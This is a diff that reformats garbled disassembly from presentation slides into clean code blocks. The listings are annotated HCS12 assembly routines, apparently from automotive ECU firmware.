+E9A169: 3B            pshd; Push D
+E9A16A: F62028        ldab    byte_2028; Load B
+E9A16D: 37            pshb; Push B
+E9A16E: ED8B          ldy     0x17+var_C,sp; Load Y
+E9A170: EC48          ldd     8,y; Load D
+E9A172: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A176: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A178: 7B2021        stab    word_2021; Store B
+E9A17B: E6F028        ldab    0xC+arg_1A,sp; Load B
+E9A17E: 37            pshb; Push B
+E9A17F: C7            clrb; Clear B
+E9A180: 37            pshb; Push B
+E9A181: E6F025        ldab    0xE+arg_15,sp; Load B
+E9A184: 37            pshb; Push B
+E9A185: E6F024        ldab    0xF+arg_13,sp; Load B
+E9A188: 37            pshb; Push B
+E9A189: EC8E          ldd     0x10+var_2,sp; Load D
+E9A18B: 3B            pshd; Push D
+E9A18C: E68D          ldab    0x12+var_5,sp; Load B
+E9A18E: 37            pshb; Push B
+E9A18F: E6F010        ldab    0x13+var_3,sp; Load B
+E9A192: 06A223        jmp     loc_E9A223; Jump Address
+E9A195: F63E04        ldab    byte_3E04; Load B
+E9A198: 042146        dbne    b,loc_E9A1E1; Decrement counter and branch if != 0
+E9A19B: E6F028        ldab    0x13+arg_13,sp; Load B
+E9A19E: 37            pshb; Push B
+E9A19F: C7            clrb; Clear B
+E9A1A0: 37            pshb; Push B
+E9A1A1: E6F025        ldab    0x15+arg_E,sp; Load B
+E9A1A4: 37            pshb; Push B
+```
 
 ## Slide 71
 
-|**E9A1A5:**
-**E9A1A8:**|E6F024
-37|**ldab**
-**shb**|0x16+arg_C,**sp**_; Load B_
-_PushB_|
-|---|---|---|---|
-|
-**E9A1A9:**|
- ECF010|**p**_; _
-**ldd**|
-0x17+var_7,**sp**_; Load D_|
-|**E9A1AC:**|3B|**pshd**_; _|_Push D_|
-|**E9A1AD:**|E68D|**ldab**|0x19+var_C,**sp**_; Load B_|
-|**E9A1AF:**|37|**pshb**_; _|_Push B_|
-|**E9A1B0:**|E68F|**ldab**|0x1A+var_B,**sp**_; Load B_|
-|**E9A1B2:**|37|**pshb**_; _|_Push B_|
-|**E9A1B3:**|ECF023|**ldd**|0x1B+arg_6,**sp**_; Load D_|
-|**E9A1B6:**|3B|**pshd**_; _|_Push D_|
-|**E9A1B7:**|F62028|**ldab**|byte_2028_; Load B_|
-|**E9A1BA:**|37|**pshb**_; _|_Push B_|
-|**E9A1BB:**|ED8B|**ldy**|0x1E+var_13,**sp**_; Load Y_|
-|**E9A1BD:**|EC48|**ldd**|8,y_; Load D_|
-|**E9A1BF:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A1C3:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A1C5:**|7B2021|**stab**|word_2021_; Store B_|
-|**E9A1C8:**|E6F028|**ldab**|0x13+arg_13,**sp**_; Load B_|
-|**E9A1CB:**|37|**pshb**_; _|_Push B_|
-|**E9A1CC:**|C7|clrb_; _|_Clear B_|
-|**E9A1CD:**|37|**pshb**_; _|_Push B_|
-|**E9A1CE:**|E6F025|**ldab**|0x15+arg_E,**sp**_; Load B_|
-|**E9A1D1:**|37|**pshb**_; _|_Push B_|
-|**E9A1D2:**|E6F024|**ldab**|0x16+arg_C,**sp**_; Load B_|
-|**E9A1D5:**|37|**pshb**_; _|_Push B_|
-|**E9A1D6:**|ECF010|**ldd**|0x17+var_7,**sp**_; Load D_|
-|**E9A1D9:**|3B|**pshd**_; _|_Push D_|
-|**E9A1DA:**|E68D|**ldab**|0x19+var_C,**sp**_; Load B_|
-|**E9A1DC:**|37|**pshb**_;_|_PushB_|
-|
-**E9A1DD:**|
- E68F|
-**ldab**|
-0x1A+var_B,**sp**_; Load B_|
-|**E9A1DF:**|2042|**bra**|loc_E9A223_; Branch always_|
-|**E9A1E1:**|E6F028|**ldab**|0x1A+argC,**sp**_; Load B_|
-|**E9A1E4:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A1E5:**|C7|clrb_; _|_Clear B_|
-|**E9A1E6:**|37|**pshb**_; _|_Push B_|
-|**E9A1E7:**|E6F025|**ldab**|0x1C+arg_7,**sp**_; Load B_|
-|**E9A1EA:**|37|**pshb**_; _|_Push B_|
-|**E9A1EB:**|E6F024|**ldab**|0x1D+arg_5,**sp**_; Load B_|
-|**E9A1EE:**|37|**pshb**_; _|_Push B_|
-|**E9A1EF:**|ECF010|**ldd**|0x1E+var_E,**sp**_; Load D_|
-|**E9A1F2:**|3B|**pshd**_; _|_Push D_|
-|**E9A1F3:**|E68D|**ldab**|0x20+var13,**sp**_; Load B_|
-|**E9A1F5:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A1F6:**|C7|clrb_; _|_Clear B_|
-|**E9A1F7:**|37|**pshb**_; _|_Push B_|
-|**E9A1F8:**|ECF023|**ldd**|0x23,**sp**_; Load D_|
-|**E9A1FB:**|3B|**pshd**_; _|_Push D_|
-|**E9A1FC:**|F62028|**ldab**|byte_2028_; Load B_|
-|**E9A1FF:**|37|**pshb**_; _|_Push B_|
-|**E9A200:**|ED8B|**ldy**|0x25+var1A**sp**_; Load Y_|
-|**E9A202:**|EC48|**ldd**|_,
-8,y_; Load D_|
-|**E9A204:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A208:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A20A:**|7B2021|**stab**|word_2021_; Store B_|
-|**E9A20D:**|E6F028|**ldab**|0x1A+argC,**sp**_; Load B_|
-|**E9A210:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A211:**|C7|clrb_; _|_Clear B_|
-|**E9A212:**|37|**pshb**_;_|_PushB_|
-|
-**E9A213:**|
- E6F025|
-**ldab**|
-0x1C+arg_7,**sp**_; Load B_|
-
-71
+```
+E9A1A5: E6F024        ldab    0x16+arg_C,sp; Load B
+E9A1A8: 37            pshb; Push B
+E9A1A9: ECF010        ldd     0x17+var_7,sp; Load D
+E9A1AC: 3B            pshd; Push D
+E9A1AD: E68D          ldab    0x19+var_C,sp; Load B
+E9A1AF: 37            pshb; Push B
+E9A1B0: E68F          ldab    0x1A+var_B,sp; Load B
+E9A1B2: 37            pshb; Push B
+E9A1B3: ECF023        ldd     0x1B+arg_6,sp; Load D
+E9A1B6: 3B            pshd; Push D
+E9A1B7: F62028        ldab    byte_2028; Load B
+E9A1BA: 37            pshb; Push B
+E9A1BB: ED8B          ldy     0x1E+var_13,sp; Load Y
+E9A1BD: EC48          ldd     8,y; Load D
+E9A1BF: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A1C3: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A1C5: 7B2021        stab    word_2021; Store B
+E9A1C8: E6F028        ldab    0x13+arg_13,sp; Load B
+E9A1CB: 37            pshb; Push B
+E9A1CC: C7            clrb; Clear B
+E9A1CD: 37            pshb; Push B
+E9A1CE: E6F025        ldab    0x15+arg_E,sp; Load B
+E9A1D1: 37            pshb; Push B
+E9A1D2: E6F024        ldab    0x16+arg_C,sp; Load B
+E9A1D5: 37            pshb; Push B
+E9A1D6: ECF010        ldd     0x17+var_7,sp; Load D
+E9A1D9: 3B            pshd; Push D
+E9A1DA: E68D          ldab    0x19+var_C,sp; Load B
+E9A1DC: 37            pshb; Push B
+E9A1DD: E68F          ldab    0x1A+var_B,sp; Load B
+E9A1DF: 2042          bra     loc_E9A223; Branch always
+E9A1E1: E6F028        ldab    0x1A+arg_C,sp; Load B
+E9A1E4: 37            pshb; Push B
+E9A1E5: C7            clrb; Clear B
+E9A1E6: 37            pshb; Push B
+E9A1E7: E6F025        ldab    0x1C+arg_7,sp; Load B
+E9A1EA: 37            pshb; Push B
+E9A1EB: E6F024        ldab    0x1D+arg_5,sp; Load B
+E9A1EE: 37            pshb; Push B
+E9A1EF: ECF010        ldd     0x1E+var_E,sp; Load D
+E9A1F2: 3B            pshd; Push D
+E9A1F3: E68D          ldab    0x20+var_13,sp; Load B
+E9A1F5: 37            pshb; Push B
+E9A1F6: C7            clrb; Clear B
+E9A1F7: 37            pshb; Push B
+E9A1F8: ECF023        ldd     0x23,sp; Load D
+E9A1FB: 3B            pshd; Push D
+E9A1FC: F62028        ldab    byte_2028; Load B
+E9A1FF: 37            pshb; Push B
+E9A200: ED8B          ldy     0x25+var_1A,sp; Load Y
+E9A202: EC48          ldd     8,y; Load D
+E9A204: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A208: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A20A: 7B2021        stab    word_2021; Store B
+E9A20D: E6F028        ldab    0x1A+arg_C,sp; Load B
+E9A210: 37            pshb; Push B
+E9A211: C7            clrb; Clear B
+E9A212: 37            pshb; Push B
+E9A213: E6F025        ldab    0x1C+arg_7,sp; Load B
+```
 
 ## Slide 72
 
-**E9A216:** 37 **pshb** _; Push B_ **E9A217:** E6F024 **ldab** 0x1D+arg_5, **sp** _; Load B_ **E9A21A:** 37 **pshb** _; Push B_ **E9A21B:** ECF010 **ldd** 0x1E+var_E, **sp** _; Load D_ **E9A21E:** 3B **pshd** _; Push D_ **E9A21F:** E68D **ldab** 0x20+var_13, **sp** _; Load B_ **E9A221:** 37 **pshb** _; Push B_ **E9A222:** C7 clrb _; Clear B_ **E9A223:** 37 **pshb** _; Push B_ **E9A224:** ECF025 **ldd** 0x22+arg_1, **sp** _; Load D_ **E9A227:** 3B **pshd** _; Push D_ **E9A228:** F62028 **ldab** byte_2028 _; Load B_ **E9A22B:** 37 **pshb** _; Push B_ **E9A22C:** ED8B **ldy** 0x25+var_1A, **sp** _; Load Y_ **E9A22E:** EC4A **ldd** 0xA,y _; Load D_ **E9A230:** 4AA333E9 **call** core_E9A333,#0xE9 _; Call subroutine in expanded memory_ **E9A234:** 1B8B **leas** 0xB, **sp** _; Load effective address into SP_ **E9A236:** 7B2022 **stab** word_2021+1 _; Store B_ **E9A239:** E6F029 **ldab** 0x1A+arg_D, **sp** _; Load B_ **E9A23C:** 042113 **dbne** b,loc_E9A252 _; Decrement counter and branch if != 0_ **E9A23F:** E6F02A **ldab** 0x1A+arg_E, **sp** _; Load B_ **E9A242:** 04210D **dbne** b,loc_E9A252 _; Decrement counter and branch if != 0_ **E9A245:** 87 clra _; Clear A_ **E9A246:** 7C2025 **std** word_2025 _; Store D_ **E9A249:** 7C2023 **std** word_2023 _; Store D_ **E9A24C:** 7C2021 **std** word_2021 _; Store D_ **E9A24F:** 792027 **clr** byte_2027 _; Clear memory_ **E9A252:** 180D89202A **movb** 0x1A+var_11, **sp** ,byte_202A _; Move byte (8-bit)_ **E9A257:** 180D882029 **movb** 0x1A+var_12, **sp** ,byte_2029 _; Move byte (8-bit)_ **E9A25C:** 1805F026201D **movw** 0x1A+arg_A, **sp** ,word_201D _; Move word (16-bit)_ **E9A262:** F62020 **ldab** byte_2020 _; Load B_ **E9A265:** C164 **cmpb** #0x64 _; 'd'; Compare B to memory_ **E9A267:** 231D **bls** loc_E9A286 _; Branch if lower or same_ **E9A269:** ECF026 **ldd** 0x1A+arg_A, **sp** _; Load D_ **E9A26C:** 8C0052 **cpd** #0x52 _; 'R'; Compare D to memory (16-bit)_ **E9A26F:** 2315 **bls** loc_E9A286 _; Branch if lower or same_ **E9A271:** F62023 **ldab** word_2023 _; Load B_ **E9A274:** C103 **cmpb** #3 _; Compare B to memory_ **E9A276:** 2707 **beq** loc_E9A27F _; Branch if equal_ **E9A278:** F62024 **ldab** word_2023+1 _; Load B_ **E9A27B:** C103 **cmpb** #3 _; Compare B to memory_ **E9A27D:** 2607 **bne** loc_E9A286 _; Branch if not equal_ **E9A27F:** F62020 **ldab** byte_2020 _; Load B_ **E9A282:** 52 incb _; Increment B_ **E9A283:** 7B2020 **stab** byte_2020 _; Store B_ **E9A286:** 31 **puly** _; Pull Y_ **E9A287:** 0A **rtc** _; Return from call_
+```
+E9A216: 37            pshb; Push B
+E9A217: E6F024        ldab    0x1D+arg_5,sp; Load B
+E9A21A: 37            pshb; Push B
+E9A21B: ECF010        ldd     0x1E+var_E,sp; Load D
+E9A21E: 3B            pshd; Push D
+E9A21F: E68D          ldab    0x20+var_13,sp; Load B
+E9A221: 37            pshb; Push B
+E9A222: C7            clrb; Clear B
+E9A223: 37            pshb; Push B
+E9A224: ECF025        ldd     0x22+arg_1,sp; Load D
+E9A227: 3B            pshd; Push D
+E9A228: F62028        ldab    byte_2028; Load B
+E9A22B: 37            pshb; Push B
+E9A22C: ED8B          ldy     0x25+var_1A,sp; Load Y
+E9A22E: EC4A          ldd     0xA,y; Load D
+E9A230: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A234: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A236: 7B2022        stab    word_2021+1; Store B
+E9A239: E6F029        ldab    0x1A+arg_D,sp; Load B
+E9A23C: 042113        dbne    b,loc_E9A252; Decrement counter and branch if != 0
+E9A23F: E6F02A        ldab    0x1A+arg_E,sp; Load B
+E9A242: 04210D        dbne    b,loc_E9A252; Decrement counter and branch if != 0
+E9A245: 87            clra; Clear A
+E9A246: 7C2025        std     word_2025; Store D
+E9A249: 7C2023        std     word_2023; Store D
+E9A24C: 7C2021        std     word_2021; Store D
+E9A24F: 792027        clr     byte_2027; Clear memory
+E9A252: 180D89202A    movb    0x1A+var_11,sp,byte_202A; Move byte (8-bit)
+E9A257: 180D882029    movb    0x1A+var_12,sp,byte_2029; Move byte (8-bit)
+E9A25C: 1805F026201D  movw    0x1A+arg_A,sp,word_201D; Move word (16-bit)
+E9A262: F62020        ldab    byte_2020; Load B
+E9A265: C164          cmpb    #0x64 ; 'd'; Compare B to memory
+E9A267: 231D          bls     loc_E9A286; Branch if lower or same
+E9A269: ECF026        ldd     0x1A+arg_A,sp; Load D
+E9A26C: 8C0052        cpd     #0x52 ; 'R'; Compare D to memory (16-bit)
+E9A26F: 2315          bls     loc_E9A286; Branch if lower or same
+E9A271: F62023        ldab    word_2023; Load B
+E9A274: C103          cmpb    #3; Compare B to memory
+E9A276: 2707          beq     loc_E9A27F; Branch if equal
+E9A278: F62024        ldab    word_2023+1; Load B
+E9A27B: C103          cmpb    #3; Compare B to memory
+E9A27D: 2607          bne     loc_E9A286; Branch if not equal
+E9A27F: F62020        ldab    byte_2020; Load B
+E9A282: 52            incb; Increment B
+E9A283: 7B2020        stab    byte_2020; Store B
+E9A286: 31            puly; Pull Y
+E9A287: 0A            rtc; Return from call
+```
 
 #### **sub_E9A300** :
 
-**E9A300:** C164 **cmpb** #0x64 _; 'd'; Compare B to memory_ **E9A302:** 2305 **bls** loc_E9A309 _; Branch if lower or same_ **E9A304:** C603 **ldab** #3 _; Load B_ **E9A306:** 1B8C **leas** 0xC, **sp** _; Load effective address into SP_ **E9A308:** 0A **rtc** _; Return from call_ **E9A309:** 1887 clrx **E9A30B:** CC0001 **ldd** #1 _; Load D_
-
-72
+```
+E9A300: C164          cmpb    #0x64 ; 'd'; Compare B to memory
+E9A302: 2305          bls     loc_E9A309; Branch if lower or same
+E9A304: C603          ldab    #3; Load B
+E9A306: 1B8C          leas    0xC,sp; Load effective address into SP
+E9A308: 0A            rtc; Return from call
+E9A309: 1887          clrx
+E9A30B: CC0001        ldd     #1; Load D
+```
 
 ## Slide 73
 
-loc_E9A306 _; Branch always_
+```
+E9A30E: 20F6          bra     loc_E9A306; Branch always
+```
 
-**E9A30E:** 20F6
+#### **sub_EAA9E9** :
 
-**bra**
-
-**sub_EAA9E9** :
-
-**EAA9E9:** 37 **pshb** _; Push B_ **EAA9EA:** C601 **ldab** #1 _; Load B_ **EAA9EC:** 7B2A1E **stab** byte_2A1E _; Store B_ **EAA9EF:** E680 **ldab** 1+var_1, **sp** _; Load B_ **EAA9F1:** 37 **pshb** _; Push B_ **EAA9F2:** C602 **ldab** #2 _; Load B_ **EAA9F4:** 4A962EF2 **call** sub_F2962E,#0xF2 _; Call subroutine in expanded memory_ **EAA9F8:** 1B81 **ins** _; Increment SP_ **EAA9FA:** 1F34EE100A **brclr** byte_34EE,#0x10,loc_EAAA09 _; Branch if selected bits clear_ **EAA9FF:** C7 clrb _; Clear B_ **EAAA00:** 37 **pshb** _; Push B_ **EAAA01:** C63A **ldab** #0x3A _; ':'; Load B_ **EAAA03:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA07:** 1B81 **ins** _; Increment SP_ **EAAA09:** 1F34EE020A **brclr** byte_34EE,#2,loc_EAAA18 _; Branch if selected bits clear_ **EAAA0E:** C7 clrb _; Clear B_ **EAAA0F:** 37 **pshb** _; Push B_ **EAAA10:** C63B **ldab** #0x3B _; ';'; Load B_ **EAAA12:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA16:** 1B81 **ins** _; Increment SP_ **EAAA18:** 1F34F1010A **brclr** byte_34F1,#1,loc_EAAA27 _; Branch if selected bits clear_ **EAAA1D:** C7 clrb _; Clear B_ **EAAA1E:** 37 **pshb** _; Push B_ **EAAA1F:** C63D **ldab** #0x3D _; '='; Load B_ **EAAA21:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA25:** 1B81 **ins** _; Increment SP_ **EAAA27:** 1F34EF200A **brclr** byte_34EF,#0x20,loc_EAAA36 _; ' '; Branch if selected bits clear_ **EAAA2C:** C7 clrb _; Clear B_ **EAAA2D:** 37 **pshb** _; Push B_ **EAAA2E:** C63F **ldab** #0x3F _; '?'; Load B_ **EAAA30:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA34:** 1B81 **ins** _; Increment SP_ **EAAA36:** 1F34EF400A **brclr** byte_34EF,#0x40,loc_EAAA45 _; '@'; Branch if selected bits clear_ **EAAA3B:** C7 clrb _; Clear B_ **EAAA3C:** 37 **pshb** _; Push B_ **EAAA3D:** C640 **ldab** #0x40 _; '@'; Load B_ **EAAA3F:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA43:** 1B81 **ins** _; Increment SP_ **EAAA45:** 1F34EF800A **brclr** byte_34EF,#0x80,loc_EAAA54 _; Branch if selected bits clear_ **EAAA4A:** C7 clrb _; Clear B_ **EAAA4B:** 37 **pshb** _; Push B_ **EAAA4C:** C641 **ldab** #0x41 _; 'A'; Load B_ **EAAA4E:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA52:** 1B81 **ins** _; Increment SP_ **EAAA54:** 1F34EE040A **brclr** byte_34EE,#4,loc_EAAA63 _; Branch if selected bits clear_ **EAAA59:** C7 clrb _; Clear B_ **EAAA5A:** 37 **pshb** _; Push B_ **EAAA5B:** C643 **ldab** #0x43 _; 'C'; Load B_ **EAAA5D:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA61:** 1B81 **ins** _; Increment SP_ **EAAA63:** 1F34EE800A **brclr** byte_34EE,#0x80,loc_EAAA72 _; Branch if selected bits clear_ **EAAA68:** C7 clrb _; Clear B_ **EAAA69:** 37 **pshb** _; Push B_
-
-73
+```
+EAA9E9: 37            pshb; Push B
+EAA9EA: C601          ldab    #1; Load B
+EAA9EC: 7B2A1E        stab    byte_2A1E; Store B
+EAA9EF: E680          ldab    1+var_1,sp; Load B
+EAA9F1: 37            pshb; Push B
+EAA9F2: C602          ldab    #2; Load B
+EAA9F4: 4A962EF2      call    sub_F2962E,#0xF2; Call subroutine in expanded memory
+EAA9F8: 1B81          ins; Increment SP
+EAA9FA: 1F34EE100A    brclr   byte_34EE,#0x10,loc_EAAA09; Branch if selected bits clear
+EAA9FF: C7            clrb; Clear B
+EAAA00: 37            pshb; Push B
+EAAA01: C63A          ldab    #0x3A ; ':'; Load B
+EAAA03: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA07: 1B81          ins; Increment SP
+EAAA09: 1F34EE020A    brclr   byte_34EE,#2,loc_EAAA18; Branch if selected bits clear
+EAAA0E: C7            clrb; Clear B
+EAAA0F: 37            pshb; Push B
+EAAA10: C63B          ldab    #0x3B ; ';'; Load B
+EAAA12: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA16: 1B81          ins; Increment SP
+EAAA18: 1F34F1010A    brclr   byte_34F1,#1,loc_EAAA27; Branch if selected bits clear
+EAAA1D: C7            clrb; Clear B
+EAAA1E: 37            pshb; Push B
+EAAA1F: C63D          ldab    #0x3D ; '='; Load B
+EAAA21: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA25: 1B81          ins; Increment SP
+EAAA27: 1F34EF200A    brclr   byte_34EF,#0x20,loc_EAAA36 ; ' '; Branch if selected bits clear
+EAAA2C: C7            clrb; Clear B
+EAAA2D: 37            pshb; Push B
+EAAA2E: C63F          ldab    #0x3F ; '?'; Load B
+EAAA30: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA34: 1B81          ins; Increment SP
+EAAA36: 1F34EF400A    brclr   byte_34EF,#0x40,loc_EAAA45 ; '@'; Branch if selected bits clear
+EAAA3B: C7            clrb; Clear B
+EAAA3C: 37            pshb; Push B
+EAAA3D: C640          ldab    #0x40 ; '@'; Load B
+EAAA3F: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA43: 1B81          ins; Increment SP
+EAAA45: 1F34EF800A    brclr   byte_34EF,#0x80,loc_EAAA54; Branch if selected bits clear
+EAAA4A: C7            clrb; Clear B
+EAAA4B: 37            pshb; Push B
+EAAA4C: C641          ldab    #0x41 ; 'A'; Load B
+EAAA4E: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA52: 1B81          ins; Increment SP
+EAAA54: 1F34EE040A    brclr   byte_34EE,#4,loc_EAAA63; Branch if selected bits clear
+EAAA59: C7            clrb; Clear B
+EAAA5A: 37            pshb; Push B
+EAAA5B: C643          ldab    #0x43 ; 'C'; Load B
+EAAA5D: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA61: 1B81          ins; Increment SP
+EAAA63: 1F34EE800A    brclr   byte_34EE,#0x80,loc_EAAA72; Branch if selected bits clear
+EAAA68: C7            clrb; Clear B
+EAAA69: 37            pshb; Push B
+```
 
 ## Slide 74
 
-**EAAA6A:** C646 **ldab** #0x46 _; 'F'; Load B_ **EAAA6C:** 4AA253F1 **call** core_F1A253,#0xF1 _; Call subroutine in expanded memory_ **EAAA70:** 1B81 **ins** _; Increment SP_ **EAAA72:** 1B81 **ins** _; Increment SP_ **EAAA74:** 0A **rtc** _; Return from call_
+```
+EAAA6A: C646          ldab    #0x46 ; 'F'; Load B
+EAAA6C: 4AA253F1      call    core_F1A253,#0xF1; Call subroutine in expanded memory
+EAAA70: 1B81          ins; Increment SP
+EAAA72: 1B81          ins; Increment SP
+EAAA74: 0A            rtc; Return from call
+```
 
 #### **sub_EBBA59** :
 
-**EBBA59:** 1B9B **leas** -5, **sp** _; Load effective address into SP_ **EBBA5B:** 6980 **clr** 5+var_5, **sp** _; Clear memory_ **EBBA5D:** EDF3000A **ldy** [0xA, **sp** ] _; Load Y_ **EBBA61:** E680 **ldab** 5+var_5, **sp** _; Load B_ **EBBA63:** 87 clra _; Clear A_ **EBBA64:** 19ED **aby** _; Add B to Y_ **EBBA66:** C603 **ldab** #3 _; Load B_ **EBBA68:** E080 **subb** 5+var_5, **sp** _; Subtract memory from B_ **EBBA6A:** 8200 **sbca** #0 _; Subtract with borrow from A_ **EBBA6C:** C30001 **addd** #1 _; Add to D_ **EBBA6F:** 180A42F6 **movb** 2,y,d, **sp** _; Move byte (8-bit)_ **EBBA73:** 6280 **inc** 5+var_5, **sp** _; Increment memory_ **EBBA75:** E680 **ldab** 5+var_5, **sp** _; Load B_ **EBBA77:** C104 **cmpb** #4 _; Compare B to memory_ **EBBA79:** 25E2 **bcs** loc_EBBA5D _; Branch if carry set_ **EBBA7B:** EC83 **ldd** 5+var_2, **sp** _; Load D_ **EBBA7D:** EE81 **ldx** 5+var_4, **sp** _; Load X_ **EBBA7F:** CDD9D9 **ldy** #0xD9D9 _; Load Y_ **EBBA82:** 16E878 **jsr** core_E878 _; Jump to subroutine_ **EBBA85:** 7C3AF9 **std** word_3AF9 _; Store D_ **EBBA88:** 7E3AF7 **stx** word_3AF7 _; Store X_ **EBBA8B:** CC0006 **ldd** #6 _; Load D_ **EBBA8E:** EE8A **ldx** 5+arg_3, **sp** _; Load X_ **EBBA90:** 6C02 **std** 2,x _; Store D_ **EBBA92:** 1B85 **leas** 5, **sp** _; Load effective address into SP_ **EBBA94:** 0A **rtc** _; Return from call_
+```
+EBBA59: 1B9B          leas    -5,sp; Load effective address into SP
+EBBA5B: 6980          clr     5+var_5,sp; Clear memory
+EBBA5D: EDF3000A      ldy     [0xA,sp]; Load Y
+EBBA61: E680          ldab    5+var_5,sp; Load B
+EBBA63: 87            clra; Clear A
+EBBA64: 19ED          aby; Add B to Y
+EBBA66: C603          ldab    #3; Load B
+EBBA68: E080          subb    5+var_5,sp; Subtract memory from B
+EBBA6A: 8200          sbca    #0; Subtract with borrow from A
+EBBA6C: C30001        addd    #1; Add to D
+EBBA6F: 180A42F6      movb    2,y,d,sp; Move byte (8-bit)
+EBBA73: 6280          inc     5+var_5,sp; Increment memory
+EBBA75: E680          ldab    5+var_5,sp; Load B
+EBBA77: C104          cmpb    #4; Compare B to memory
+EBBA79: 25E2          bcs     loc_EBBA5D; Branch if carry set
+EBBA7B: EC83          ldd     5+var_2,sp; Load D
+EBBA7D: EE81          ldx     5+var_4,sp; Load X
+EBBA7F: CDD9D9        ldy     #0xD9D9; Load Y
+EBBA82: 16E878        jsr     core_E878; Jump to subroutine
+EBBA85: 7C3AF9        std     word_3AF9; Store D
+EBBA88: 7E3AF7        stx     word_3AF7; Store X
+EBBA8B: CC0006        ldd     #6; Load D
+EBBA8E: EE8A          ldx     5+arg_3,sp; Load X
+EBBA90: 6C02          std     2,x; Store D
+EBBA92: 1B85          leas    5,sp; Load effective address into SP
+EBBA94: 0A            rtc; Return from call
+```
 
 #### **sub_EBBA98** :
 
-|**EBBA98:**|C089|**subb**|#0x89_; Subtract memory from B_|
-|---|---|---|---|
-|**EBBA9A:**|2711|**beq**|loc_EBBAAD_; Branch if equal_|
-|**EBBA9C:**|040112|**dbeq**|b,loc_EBBAB1_; Decrement counter and branch if = 0_|
-|**EBBA9F:**|040113|**dbeq**|b,loc_EBBAB5_; Decrement counter and branch if = 0_|
-|**EBBAA2:**|C06B|**subb**|#0x6B _; 'k'; Subtract memory from B_|
-|**EBBAA4:**|2713|**beq**|loc_EBBAB9_; Branch if equal_|
-|**EBBAA6:**|040114|**dbeq**|b,loc_EBBABD_; Decrement counter and branch if = 0_|
-|**EBBAA9:**|C6CA|**ldab**|#0xCA_; Load B_|
-|**EBBAAB:**|2012|**bra**|loc_EBBABF_; Branch always_|
-|**EBBAAD:**|C6CA|**ldab**|#0xCA_; Load B_|
-|**EBBAAF:**|200E|**bra**|loc_EBBABF_; Branch always_|
-|**EBBAB1:**|C6C2|**ldab**|#0xC2_; Load B_|
-|**EBBAB3:**|200A|**bra**|loc_EBBABF_; Branch always_|
-|**EBBAB5:**|C6BA|**ldab**|#0xBA_; Load B_|
-|**EBBAB7:**|2006|**bra**|loc_EBBABF_; Branch always_|
-|**EBBAB9:**|C6B2|**ldab**|#0xB2_; Load B_|
-|**EBBABB:**|2002|**bra**|loc_EBBABF_; Branch always_|
-
-74
+```
+EBBA98: C089          subb    #0x89; Subtract memory from B
+EBBA9A: 2711          beq     loc_EBBAAD; Branch if equal
+EBBA9C: 040112        dbeq    b,loc_EBBAB1; Decrement counter and branch if = 0
+EBBA9F: 040113        dbeq    b,loc_EBBAB5; Decrement counter and branch if = 0
+EBBAA2: C06B          subb    #0x6B ; 'k'; Subtract memory from B
+EBBAA4: 2713          beq     loc_EBBAB9; Branch if equal
+EBBAA6: 040114        dbeq    b,loc_EBBABD; Decrement counter and branch if = 0
+EBBAA9: C6CA          ldab    #0xCA; Load B
+EBBAAB: 2012          bra     loc_EBBABF; Branch always
+EBBAAD: C6CA          ldab    #0xCA; Load B
+EBBAAF: 200E          bra     loc_EBBABF; Branch always
+EBBAB1: C6C2          ldab    #0xC2; Load B
+EBBAB3: 200A          bra     loc_EBBABF; Branch always
+EBBAB5: C6BA          ldab    #0xBA; Load B
+EBBAB7: 2006          bra     loc_EBBABF; Branch always
+EBBAB9: C6B2          ldab    #0xB2; Load B
+EBBABB: 2002          bra     loc_EBBABF; Branch always
+```
 
 ## Slide 75
 
-**EBBABD:** C6AA **ldab** #0xAA _; Load B_ **EBBABF:** 7B11FB **stab** byte_FD11FB _; Store B_ **EBBAC2:** 0A **rtc** _; Return from call_
+```
+EBBABD: C6AA          ldab    #0xAA; Load B
+EBBABF: 7B11FB        stab    byte_FD11FB; Store B
+EBBAC2: 0A            rtc; Return from call
+```
 
-**sub_EC80DE** :
+#### **sub_EC80DE** :
 
-**EC80DE:** 37 **pshb** _; Push B_ **EC80DF:** 4AA336F3 **call** mdfy_disablePIT_F3A336,#0xF3 _; Call subroutine in expanded memory_ **EC80E3:** E680 **ldab** 1+var_1, **sp** _; Load B_ **EC80E5:** 37 **pshb** _; Push B_ **EC80E6:** C602 **ldab** #2 _; Load B_ **EC80E8:** 4ABB47EB **call** core_sci2_rx_SM_EBBB47,#0xEB _; Call subroutine in expanded memory_ **EC80EC:** 1B82 **leas** 2, **sp** _; Load effective address into SP_ **EC80EE:** 0A **rtc** _; Return from call_
+```
